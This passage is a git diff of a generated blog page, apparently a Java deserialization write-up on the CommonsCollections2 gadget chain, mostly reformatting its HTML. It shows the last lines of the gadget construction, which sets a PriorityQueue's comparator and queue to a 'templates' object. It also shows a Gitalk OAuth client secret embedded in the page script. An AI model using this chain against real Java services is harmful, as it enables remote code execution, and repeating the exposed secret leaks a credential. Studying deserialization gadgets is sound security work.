+    <span style=color:#75715e>// Construct PriorityQueue, which requires no less than two elements, or sets its size to 2.
+</span><span style=color:#75715e></span>    <span style=color:#75715e>// Use the reflection settings comparator, and queue&#39;s first element is templates.
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>final</span> PriorityQueue queue <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PriorityQueue<span style=color:#f92672>(</span>2<span style=color:#f92672>);</span>
+    queue<span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span>1<span style=color:#f92672>);</span>
+    queue<span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span>2<span style=color:#f92672>);</span>
+    setFieldValue<span style=color:#f92672>(</span>queue<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;comparator&#34;</span><span style=color:#f92672>,</span> comparator<span style=color:#f92672>);</span>
+    setFieldValue<span style=color:#f92672>(</span>queue<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;queue&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span>templates<span style=color:#f92672>,</span> 1<span style=color:#f92672>});</span>
 
-    <span style="color:#66d9ef">return</span> queue<span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
-</code></pre></div><p><img src="https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/vulns/java/cc2/CC2Calc.png" alt="CC2Calc"></p>
-
-            </div>
-        </div>
-        <div class="w-200">
-            <div id="gitalk"></div>
-<script>
-    var gitalk = new Gitalk({
-        clientID: '9a04c6b451fbce76511d',
-        clientSecret: '430c540c77ecd6b59749c60f0341c057bd5320a0',
-        repo: 'Causa1ity.github.io',
-        owner: 'Causa1ity',
-        admin: 'Causa1ity',
-        id: 'https:\/\/causality.top\/security\/javasec\/commonscollections2\/',
-        distractionFreeMode: false
-    })
-
-    gitalk.render('gitalk')
-</script>
-        </div>
-    </div>
+    <span style=color:#66d9ef>return</span> queue<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
+</code></pre></div><p><img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/vulns/java/cc2/CC2Calc.png alt=CC2Calc></p>
 </div>
-<script>
-    CodeLine.initOnPageLoad({
-        copyBtn: {show: true, position: 'top'},
-        toggleBtn: {show: false}
-    })
-</script>
+</div>
+<div class=w-200>
+<div id=gitalk></div>
+<script>var gitalk=new Gitalk({clientID:'9a04c6b451fbce76511d',clientSecret:'430c540c77ecd6b59749c60f0341c057bd5320a0',repo:'Causa1ity.github.io',owner:'Causa1ity',admin:'Causa1ity',id:'https://causality.top/security/javasec/commonscollections2/',distractionFreeMode:!1});gitalk.render('gitalk')</script>
+</div>
+</div>
+</div>
+<script>CodeLine.initOnPageLoad({copyBtn:{show:!0,position:'top'},toggleBtn:{show:!1}})</script>
 <div class="text-center my-8">
-    <span class="font-serif text-lg">
-        Powered By <a href="https://gohugo.io/" class="font-bold hover:text-blue-400">Hugo</a>
-        with theme <a href="https://github.com/causa1ity/hugo-theme-noth/" class="font-bold hover:text-blue-400">Noth</a>
-    </span>
+<span class="font-serif text-lg">
+Powered By <a href=https://gohugo.io/ class="font-bold hover:text-blue-400">Hugo</a>
+with theme <a href=https://github.com/causa1ity/hugo-theme-noth/ class="font-bold hover:text-blue-400">Noth</a>
+</span>
 </div></body>
 </html>
